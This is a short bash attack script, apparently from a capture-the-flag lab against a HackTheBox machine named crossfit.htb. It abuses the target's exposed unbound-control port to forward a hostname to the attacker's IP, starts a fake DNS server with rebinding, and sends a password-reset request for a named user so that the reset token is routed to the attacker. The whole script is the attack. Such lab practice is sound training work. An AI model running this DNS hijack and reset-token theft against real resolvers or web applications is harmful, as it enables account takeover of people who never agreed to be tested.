#!/bin/bash
unbound-control -c unbound.conf -s 10.10.10.232@8953 forward_add +i xemployees.crossfit.htb. 10.10.14.14@9953

python3 fakedns.py -c dns.conf -p 9953 --rebind &

sleep 3
echo "FakeDNS is running..."
curl http://xemployees.crossfit.htb/password-reset.php -XPOST -d 'email=david.palmer@crossfit.htb' | grep alert

while :
do
	sleep 1
done